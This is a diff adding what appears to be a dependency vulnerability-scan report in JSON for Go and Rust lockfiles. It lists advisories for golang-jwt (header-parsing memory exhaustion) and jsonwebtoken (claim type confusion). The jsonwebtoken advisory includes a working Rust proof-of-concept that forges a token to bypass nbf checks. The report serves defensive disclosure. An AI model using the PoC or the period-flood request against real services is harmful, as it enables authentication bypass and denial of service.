@@ -1,0 +1,1558 @@
+{
+  "results": [
+    {
+      "source": {
+        "path": "/dependencies/go/go.mod",
+        "type": "lockfile"
+      },
+      "packages": [
+        {
+          "package": {
+            "name": "github.com/golang-jwt/jwt/v4",
+            "version": "4.5.1",
+            "ecosystem": "Go",
+            "purl": "pkg:golang/github.com/golang-jwt/jwt/v4@4.5.1"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GO-2025-3553",
+                "GHSA-mh63-6h87-95cp"
+              ],
+              "aliases": [
+                "CVE-2025-30204",
+                "GHSA-mh63-6h87-95cp",
+                "GO-2025-3553"
+              ],
+              "max_severity": "8.7"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://vuln.go.dev/ID/GO-2025-3553.json"
+                  },
+                  "ecosystem_specific": {},
+                  "package": {
+                    "ecosystem": "Go",
+                    "name": "github.com/golang-jwt/jwt",
+                    "purl": "pkg:golang/github.com/golang-jwt/jwt"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://vuln.go.dev/ID/GO-2025-3553.json"
+                  },
+                  "ecosystem_specific": {
+                    "imports": [
+                      {
+                        "path": "github.com/golang-jwt/jwt/v4",
+                        "symbols": [
+                          "Parser.ParseUnverified"
+                        ]
+                      }
+                    ]
+                  },
+                  "package": {
+                    "ecosystem": "Go",
+                    "name": "github.com/golang-jwt/jwt/v4",
+                    "purl": "pkg:golang/github.com/golang-jwt/jwt/v4"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "4.5.2"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://vuln.go.dev/ID/GO-2025-3553.json"
+                  },
+                  "ecosystem_specific": {
+                    "imports": [
+                      {
+                        "path": "github.com/golang-jwt/jwt/v5",
+                        "symbols": [
+                          "Parser.ParseUnverified"
+                        ]
+                      }
+                    ]
+                  },
+                  "package": {
+                    "ecosystem": "Go",
+                    "name": "github.com/golang-jwt/jwt/v5",
+                    "purl": "pkg:golang/github.com/golang-jwt/jwt/v5"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "5.0.0-rc.1"
+                        },
+                        {
+                          "fixed": "5.2.2"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2025-30204",
+                "GHSA-mh63-6h87-95cp"
+              ],
+              "database_specific": {
+                "review_status": "REVIEWED",
+                "url": "https://pkg.go.dev/vuln/GO-2025-3553"
+              },
+              "details": "Excessive memory allocation during header parsing in github.com/golang-jwt/jwt",
+              "id": "GO-2025-3553",
+              "modified": "2026-08-08T10:26:51.808116092Z",
+              "published": "2025-03-26T17:24:24Z",
+              "references": [
+                {
+                  "type": "ADVISORY",
+                  "url": "https://github.com/golang-jwt/jwt/security/advisories/GHSA-mh63-6h87-95cp"
+                },
+                {
+                  "type": "FIX",
+                  "url": "https://github.com/golang-jwt/jwt/commit/0951d184286dece21f73c85673fd308786ffe9c3"
+                }
+              ],
+              "related": [
+                "CGA-mpmq-7q6x-72g6",
+                "RHEA-2025:4438",
+                "RHSA-2025:3344",
+                "RHSA-2025:3411",
+                "RHSA-2025:3616",
+                "RHSA-2025:3618",
+                "RHSA-2025:3698",
+                "RHSA-2025:4462",
+                "RHSA-2025:4569",
+                "RHSA-2025:4669",
+                "RHSA-2025:7404",
+                "RHSA-2025:7407",
+                "RHSA-2025:7425",
+                "RHSA-2025:7475",
+                "RHSA-2025:7479",
+                "RHSA-2025:7503",
+                "RHSA-2025:7967",
+                "RHSA-2025:8075",
+                "RHSA-2025:8267",
+                "RHSA-2026:1536"
+              ],
+              "schema_version": "1.7.3",
+              "summary": "Excessive memory allocation during header parsing in github.com/golang-jwt/jwt"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/03/GHSA-mh63-6h87-95cp/GHSA-mh63-6h87-95cp.json"
+                  },
+                  "package": {
+                    "ecosystem": "Go",
+                    "name": "github.com/golang-jwt/jwt/v5",
+                    "purl": "pkg:golang/github.com/golang-jwt/jwt/v5"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "5.0.0-rc.1"
+                        },
+                        {
+                          "fixed": "5.2.2"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/03/GHSA-mh63-6h87-95cp/GHSA-mh63-6h87-95cp.json"
+                  },
+                  "package": {
+                    "ecosystem": "Go",
+                    "name": "github.com/golang-jwt/jwt/v4",
+                    "purl": "pkg:golang/github.com/golang-jwt/jwt/v4"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "4.5.2"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/03/GHSA-mh63-6h87-95cp/GHSA-mh63-6h87-95cp.json"
+                  },
+                  "package": {
+                    "ecosystem": "Go",
+                    "name": "github.com/golang-jwt/jwt",
+                    "purl": "pkg:golang/github.com/golang-jwt/jwt"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "3.2.0"
+                        },
+                        {
+                          "last_affected": "3.2.2"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2025-30204",
+                "GO-2025-3553"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-405"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-03-21T22:04:00Z",
+                "nvd_published_at": "2025-03-21T22:15:26Z",
+                "severity": "HIGH"
+              },
+              "details": "### Summary\n\nFunction [`parse.ParseUnverified`](https://github.com/golang-jwt/jwt/blob/c035977d9e11c351f4c05dfeae193923cbab49ee/parser.go#L138-L139) currently splits (via a call to [strings.Split](https://pkg.go.dev/strings#Split)) its argument (which is untrusted data) on periods.\n\nAs a result, in the face of a malicious request whose _Authorization_ header consists of `Bearer ` followed by many period characters, a call to that function incurs allocations to the tune of O(n) bytes (where n stands for the length of the function's argument), with a constant factor of about 16. Relevant weakness: [CWE-405: Asymmetric Resource Consumption (Amplification)](https://cwe.mitre.org/data/definitions/405.html)\n\n### Details\n\nSee [`parse.ParseUnverified`](https://github.com/golang-jwt/jwt/blob/c035977d9e11c351f4c05dfeae193923cbab49ee/parser.go#L138-L139) \n\n### Impact\n\nExcessive memory allocation",
+              "id": "GHSA-mh63-6h87-95cp",
+              "modified": "2026-09-10T03:50:56.801646453Z",
+              "published": "2025-03-21T22:04:00Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/golang-jwt/jwt/security/advisories/GHSA-mh63-6h87-95cp"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-30204"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/golang-jwt/jwt/commit/0951d184286dece21f73c85673fd308786ffe9c3"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/golang-jwt/jwt/commit/bf316c48137a1212f8d0af9288cc9ce8e59f1afb"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/golang-jwt/jwt"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://security.netapp.com/advisory/ntap-20250404-0002"
+                }
+              ],
+              "schema_version": "1.9.0",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+                  "type": "CVSS_V3"
+                },
+                {
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "jwt-go allows excessive memory allocation during header parsing"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "source": {
+        "path": "/dependencies/rust/Cargo.lock",
+        "type": "lockfile"
+      },
+      "packages": [
+        {
+          "package": {
+            "name": "atomic-waker",
+            "version": "1.1.2",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/atomic-waker@1.1.2"
+          }
+        },
+        {
+          "package": {
+            "name": "autocfg",
+            "version": "1.5.1",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/autocfg@1.5.1"
+          }
+        },
+        {
+          "package": {
+            "name": "base64",
+            "version": "0.21.7",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/base64@0.21.7"
+          }
+        },
+        {
+          "package": {
+            "name": "base64",
+            "version": "0.22.1",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/base64@0.22.1"
+          }
+        },
+        {
+          "package": {
+            "name": "base64",
+            "version": "0.23.1",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/base64@0.23.1"
+          }
+        },
+        {
+          "package": {
+            "name": "bitflags",
+            "version": "2.13.2",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/bitflags@2.13.2"
+          }
+        },
+        {
+          "package": {
+            "name": "bumpalo",
+            "version": "3.20.3",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/bumpalo@3.20.3"
+          }
+        },
+        {
+          "package": {
+            "name": "bytes",
+            "version": "1.12.1",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/bytes@1.12.1"
+          }
+        },
+        {
+          "package": {
+            "name": "cc",
+            "version": "1.11.1",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/cc@1.11.1"
+          }
+        },
+        {
+          "package": {
+            "name": "cfg-if",
+            "version": "1.0.5",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/cfg-if@1.0.5"
+          }
+        },
+        {
+          "package": {
+            "name": "cfg_aliases",
+            "version": "0.2.2",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/cfg_aliases@0.2.2"
+          }
+        },
+        {
+          "package": {
+            "name": "chacha20",
+            "version": "0.10.2",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/chacha20@0.10.2"
+          }
+        },
+        {
+          "package": {
+            "name": "ci-helper",
+            "version": "0.1.0",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/ci-helper@0.1.0"
+          }
+        },
+        {
+          "package": {
+            "name": "cpufeatures",
+            "version": "0.3.1",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/cpufeatures@0.3.1"
+          }
+        },
+        {
+          "package": {
+            "name": "deranged",
+            "version": "0.5.9",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/deranged@0.5.9"
+          }
+        },
+        {
+          "package": {
+            "name": "displaydoc",
+            "version": "0.2.7",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/displaydoc@0.2.7"
+          }
+        },
+        {
+          "package": {
+            "name": "find-msvc-tools",
+            "version": "0.1.15",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/find-msvc-tools@0.1.15"
+          }
+        },
+        {
+          "package": {
+            "name": "form_urlencoded",
+            "version": "1.2.2",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/form_urlencoded@1.2.2"
+          }
+        },
+        {
+          "package": {
+            "name": "futures-channel",
+            "version": "0.3.34",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/futures-channel@0.3.34"
+          }
+        },
+        {
+          "package": {
+            "name": "futures-core",
+            "version": "0.3.34",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/futures-core@0.3.34"
+          }
+        },
+        {
+          "package": {
+            "name": "futures-task",
+            "version": "0.3.34",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/futures-task@0.3.34"
+          }
+        },
+        {
+          "package": {
+            "name": "futures-util",
+            "version": "0.3.34",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/futures-util@0.3.34"
+          }
+        },
+        {
+          "package": {
+            "name": "getrandom",
+            "version": "0.2.17",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/getrandom@0.2.17"
+          }
+        },
+        {
+          "package": {
+            "name": "getrandom",
+            "version": "0.4.3",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/getrandom@0.4.3"
+          }
+        },
+        {
+          "package": {
+            "name": "http",
+            "version": "1.5.0",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/http@1.5.0"
+          }
+        },
+        {
+          "package": {
+            "name": "http-body",
+            "version": "1.1.0",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/http-body@1.1.0"
+          }
+        },
+        {
+          "package": {
+            "name": "http-body-util",
+            "version": "0.1.5",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/http-body-util@0.1.5"
+          }
+        },
+        {
+          "package": {
+            "name": "httparse",
+            "version": "1.10.1",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/httparse@1.10.1"
+          }
+        },
+        {
+          "package": {
+            "name": "hyper",
+            "version": "1.12.0",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/hyper@1.12.0"
+          }
+        },
+        {
+          "package": {
+            "name": "hyper-rustls",
+            "version": "0.27.10",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/hyper-rustls@0.27.10"
+          }
+        },
+        {
+          "package": {
+            "name": "hyper-util",
+            "version": "0.1.21",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/hyper-util@0.1.21"
+          }
+        },
+        {
+          "package": {
+            "name": "icu_collections",
+            "version": "2.4.0",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/icu_collections@2.4.0"
+          }
+        },
+        {
+          "package": {
+            "name": "icu_locale_core",
+            "version": "2.4.0",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/icu_locale_core@2.4.0"
+          }
+        },
+        {
+          "package": {
+            "name": "icu_normalizer",
+            "version": "2.4.0",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/icu_normalizer@2.4.0"
+          }
+        },
+        {
+          "package": {
+            "name": "icu_normalizer_data",
+            "version": "2.4.0",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/icu_normalizer_data@2.4.0"
+          }
+        },
+        {
+          "package": {
+            "name": "icu_properties",
+            "version": "2.4.0",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/icu_properties@2.4.0"
+          }
+        },
+        {
+          "package": {
+            "name": "icu_properties_data",
+            "version": "2.4.0",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/icu_properties_data@2.4.0"
+          }
+        },
+        {
+          "package": {
+            "name": "icu_provider",
+            "version": "2.4.0",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/icu_provider@2.4.0"
+          }
+        },
+        {
+          "package": {
+            "name": "idna",
+            "version": "1.1.0",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/idna@1.1.0"
+          }
+        },
+        {
+          "package": {
+            "name": "idna_adapter",
+            "version": "1.2.2",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/idna_adapter@1.2.2"
+          }
+        },
+        {
+          "package": {
+            "name": "ipnet",
+            "version": "2.12.2",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/ipnet@2.12.2"
+          }
+        },
+        {
+          "package": {
+            "name": "itoa",
+            "version": "1.0.19",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/itoa@1.0.19"
+          }
+        },
+        {
+          "package": {
+            "name": "js-sys",
+            "version": "0.3.107",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/js-sys@0.3.107"
+          }
+        },
+        {
+          "package": {
+            "name": "jsonwebtoken",
+            "version": "9.3.0",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/jsonwebtoken@9.3.0"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-h395-gr6q-cpjc"
+              ],
+              "aliases": [
+                "CVE-2026-25537",
+                "GHSA-h395-gr6q-cpjc"
+              ],
+              "max_severity": "5.5"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-h395-gr6q-cpjc/GHSA-h395-gr6q-cpjc.json"
+                  },
+                  "package": {
+                    "ecosystem": "crates.io",
+                    "name": "jsonwebtoken",
+                    "purl": "pkg:cargo/jsonwebtoken"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "10.3.0"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-25537"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-843"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-02-03T18:47:40Z",
+                "nvd_published_at": "2026-02-04T22:15:59Z",
+                "severity": "MODERATE"
+              },
+              "details": "## Summary:\n\nIt has been discovered that there is a Type Confusion vulnerability in jsonwebtoken, specifically, in its claim validation logic.\n\nWhen a standard claim (such as nbf or exp) is provided with an incorrect JSON type (Like a String instead of a Number), the library’s internal parsing mechanism marks the claim as “FailedToParse”. Crucially, the validation logic treats this “FailedToParse” state identically to “NotPresent”.\n\nThis means that if a check is enabled (like: validate_nbf = true), but the claim is not explicitly marked as required in required_spec_claims, the library will skip the validation check entirely for the malformed claim, treating it as if it were not there. This allows attackers to bypass critical time-based security restrictions (like “Not Before” checks) and commit potential authentication and authorization bypasses.\n\n## Details:\n\nThe vulnerability stems from the interaction between the TryParse enum and the validate function in [src/validation.rs](https://github.com/Keats/jsonwebtoken/blob/master/src/validation.rs).\n\n 1. The TryParse Enum: The library uses a custom TryParse enum to handle claim deserialization:\n```\nenum TryParse\u003cT\u003e {\n    Parsed(T),\n    FailedToParse, // Set when deserialization fails (e.g. type mismatch)\n    NotPresent,\n}\n```\nIf a user sends {“nbf”: “99999999999”} (legacy/string format), serde fails to parse it as u64, and it results in TryParse::FailedToParse.\n\n 1. The Validation Logic Flaw (src/validation.rs): In Validation::validate, the code checks for exp and nbf\nlike this:\n```\n// L288-291\nif matches!(claims.nbf, TryParse::Parsed(nbf) if options.validate_nbf \u0026\u0026 nbf \u003e now + options.leeway) {\n    return Err(new_error(ErrorKind::ImmatureSignature));\n}\n```\nThis matches! macro explicitly looks for TryParse::Parsed(nbf).\n\n • If claims.nbf is FailedToParse, the match returns false.\n • The if block is skipped.\n • No error is returned.\n 1. The “Required Claims” Gap: The only fallback mechanism is the “Required Claims” check:\n```\n// Lines 259-267\nfor required_claim in \u0026options.required_spec_claims {\n    let present = match required_claim.as_str() {\n        \"nbf\" =\u003e matches!(claims.nbf, TryParse::Parsed(_)),\n        // ...\n    };\n    if !present { return Err(...); }\n}\n```\nIf “nbf” IS in required_spec_claims, FailedToParse will fail the matches!(..., Parsed(_)) check, causing the present to be false, and correctly returning an error.\n\nHowever, widely accepted usage patterns often enable validation flags (validate_nbf = true) without adding the claim to the required list, assuming that enabling validation implicitly requires the claim’s validity if it appears in the token. jsonwebtoken seems to violate this assumption.\n\nEnvironment:\n\n • Version: jsonwebtoken 10.2.0\n • Rust Version: rustc 1.90.0\n • Cargo Version: cargo 1.90.0\n • OS: MacOS Tahoe 26.2\n\nPOC:\n\nFor demonstrating, Here is this simple rust code that demonstrates the bypass. It attempts to validate a token with a string nbf claiming to be valid only in the far future.\n\ncreate a new project:\n```\ncargo new nbf_poc; cd nbf_poc\n```\nadd required dependencies:\n```\ncargo add serde --features derive\ncargo add jsonwebtoken --features rust_crypto\ncargo add serde_json\n```\nreplace the code in src/main.rs with this:\n\n```\nuse jsonwebtoken::{decode, Validation, Algorithm, DecodingKey, Header, EncodingKey, encode};\nuse serde::{Deserialize, Serialize};\n\n#[derive(Debug, Serialize, Deserialize)]\nstruct Claims {\n    sub: String,\n    nbf: String, // Attacker sends nbf as a String\n    exp: usize,\n}\nfn main() {\n    let key: \u0026[u8; 24] = b\"RedMouseOverTheSkyIsBlue\";\n\n    // nbf is a String \"99999999999\" (Far future)\n    // Real nbf should be a Number.\n    let my_claims: Claims = Claims {\n        sub: \"krishna\".to_string(),\n        nbf: \"99999999999\".to_string(), \n        exp: 10000000000, \n    };\n\n    let token: String = encode(\u0026Header::default(), \u0026my_claims, \u0026EncodingKey::from_secret(key)).unwrap();\n    println!(\"Forged Token: {}\", token);\n\n    // 2. Configure Validation\n    let mut validation: Validation = Validation::new(Algorithm::HS256);\n    validation.validate_nbf = true; // Enable NBF check\n\n    // We do NOT add \"nbf\" to required_spec_claims (default behavior)\n\n    // We decode to serde_json::Value to avoid strict type errors in our struct definition hiding the library bug.\n    // The library sees the raw JSON with string \"nbf\".\n    let result: Result\u003cjsonwebtoken::TokenData\u003cserde_json::Value\u003e, jsonwebtoken::errors::Error\u003e = decode::\u003cserde_json::Value\u003e(\n        \u0026token, \n        \u0026DecodingKey::from_secret(key), \n        \u0026validation\n    );\n\n    match result {\n        Ok(_) =\u003e println!(\"Token was accepted despite malformed far-future 'nbf'!\"),\n        Err(e) =\u003e println!(\"Token rejected. Error: {:?}\", e),\n    }\n}\n```\nrun cargo run\n\nexpected behaviour:\n\n```\nForged Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJrcmlzaG5hIiwibmJmIjoiOTk5OTk5OTk5OTkiLCJleHAiOjEwMDAwMDAwMDAwfQ.Fm3kZIqMwqIA6sEA1w52UOMqqnu4hlO3FQStFmbaOwk\n```\nToken was accepted despite malformed far-future 'nbf'!\nImpact:\n\nIf an application uses jsonwebtoken nbf (Not Before) to schedule access for the future (like “Access granted starting tomorrow”).\n\nBy sending nbf as a string, an attacker can bypass this restriction and access the resource immediately.\n\nand for the exp claim (this is unlikely but still adding), If a developer sets validate_exp = true but manually handles claim presence (removing exp from required_spec_claims), an attacker can send a string exp (e.g., “never”) and bypass expiration checks entirely. The token becomes valid forever.",
+              "id": "GHSA-h395-gr6q-cpjc",
+              "modified": "2026-09-10T03:50:35.169824826Z",
+              "published": "2026-02-03T18:47:40Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/Keats/jsonwebtoken/security/advisories/GHSA-h395-gr6q-cpjc"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-25537"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/Keats/jsonwebtoken/commit/abbc3076742c4161347bc6b8bf4aa5eb86e1dc01"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/Keats/jsonwebtoken"
+                }
+              ],
+              "schema_version": "1.9.0",
+              "severity": [
+                {
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N/E:P",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "jsonwebtoken has Type Confusion that leads to potential authorization bypass"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "libc",
+            "version": "0.2.191",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/libc@0.2.191"
+          }
+        },
+        {
+          "package": {
+            "name": "litemap",
+            "version": "0.8.3",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/litemap@0.8.3"
+          }
+        },
+        {
+          "package": {
+            "name": "log",
+            "version": "0.4.35",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/log@0.4.35"
+          }
+        },
+        {
+          "package": {
+            "name": "lru-slab",
+            "version": "0.1.3",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/lru-slab@0.1.3"
+          }
+        },
+        {
+          "package": {
+            "name": "memchr",
+            "version": "2.8.3",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/memchr@2.8.3"
+          }
+        },
+        {
+          "package": {
+            "name": "mio",
+            "version": "1.2.4",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/mio@1.2.4"
+          }
+        },
+        {
+          "package": {
+            "name": "num-bigint",
+            "version": "0.4.8",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/num-bigint@0.4.8"
+          }
+        },
+        {
+          "package": {
+            "name": "num-conv",
+            "version": "0.2.2",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/num-conv@0.2.2"
+          }
+        },
+        {
+          "package": {
+            "name": "num-integer",
+            "version": "0.1.47",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/num-integer@0.1.47"
+          }
+        },
+        {
+          "package": {
+            "name": "num-traits",
+            "version": "0.2.19",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/num-traits@0.2.19"
+          }
+        },
+        {
+          "package": {
+            "name": "once_cell",
+            "version": "1.21.4",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/once_cell@1.21.4"
+          }
+        },
+        {
+          "package": {
+            "name": "pem",
+            "version": "3.0.6",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/pem@3.0.6"
+          }
+        },
+        {
+          "package": {
+            "name": "percent-encoding",
+            "version": "2.3.2",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/percent-encoding@2.3.2"
+          }
+        },
+        {
+          "package": {
+            "name": "pin-project-lite",
+            "version": "0.2.17",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/pin-project-lite@0.2.17"
+          }
+        },
+        {
+          "package": {
+            "name": "potential_utf",
+            "version": "0.1.6",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/potential_utf@0.1.6"
+          }
+        },
+        {
+          "package": {
+            "name": "powerfmt",
+            "version": "0.2.1",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/powerfmt@0.2.1"
+          }
+        },
+        {
+          "package": {
+            "name": "proc-macro2",
+            "version": "1.0.107",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/proc-macro2@1.0.107"
+          }
+        },
+        {
+          "package": {
+            "name": "quinn",
+            "version": "0.11.12",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/quinn@0.11.12"
+          }
+        },
+        {
+          "package": {
+            "name": "quinn-proto",
+            "version": "0.11.19",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/quinn-proto@0.11.19"
+          }
+        },
+        {
+          "package": {
+            "name": "quinn-udp",
+            "version": "0.5.16",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/quinn-udp@0.5.16"
+          }
+        },
+        {
+          "package": {
+            "name": "quote",
+            "version": "1.0.47",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/quote@1.0.47"
+          }
+        },
+        {
+          "package": {
+            "name": "r-efi",
+            "version": "6.0.0",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/r-efi@6.0.0"
+          }
+        },
+        {
+          "package": {
+            "name": "rand",
+            "version": "0.10.3",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/rand@0.10.3"
+          }
+        },
+        {
+          "package": {
+            "name": "rand_core",
+            "version": "0.10.1",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/rand_core@0.10.1"
+          }
+        },
+        {
+          "package": {
+            "name": "rand_pcg",
+            "version": "0.10.2",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/rand_pcg@0.10.2"
+          }
+        },
+        {
+          "package": {
+            "name": "reqwest",
+            "version": "0.12.28",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/reqwest@0.12.28"
+          }
+        },
+        {
+          "package": {
+            "name": "ring",
+            "version": "0.17.14",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/ring@0.17.14"
+          }
+        },
+        {
+          "package": {
+            "name": "rustc-hash",
+            "version": "2.1.3",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/rustc-hash@2.1.3"
+          }
+        },
+        {
+          "package": {
+            "name": "rustls",
+            "version": "0.23.46",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/rustls@0.23.46"
+          }
+        },
+        {
+          "package": {
+            "name": "rustls-pki-types",
+            "version": "1.16.0",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/rustls-pki-types@1.16.0"
+          }
+        },
+        {
+          "package": {
+            "name": "rustls-webpki",
+            "version": "0.103.17",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/rustls-webpki@0.103.17"
+          }
+        },
+        {
+          "package": {
+            "name": "rustversion",
+            "version": "1.0.23",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/rustversion@1.0.23"
+          }
+        },
+        {
+          "package": {
+            "name": "ryu",
+            "version": "1.0.23",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/ryu@1.0.23"
+          }
+        },
+        {
+          "package": {
+            "name": "serde",
+            "version": "1.0.229",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/serde@1.0.229"
+          }
+        },
+        {
+          "package": {
+            "name": "serde_core",
+            "version": "1.0.229",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/serde_core@1.0.229"
+          }
+        },
+        {
+          "package": {
+            "name": "serde_derive",
+            "version": "1.0.229",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/serde_derive@1.0.229"
+          }
+        },
+        {
+          "package": {
+            "name": "serde_json",
+            "version": "1.0.154",
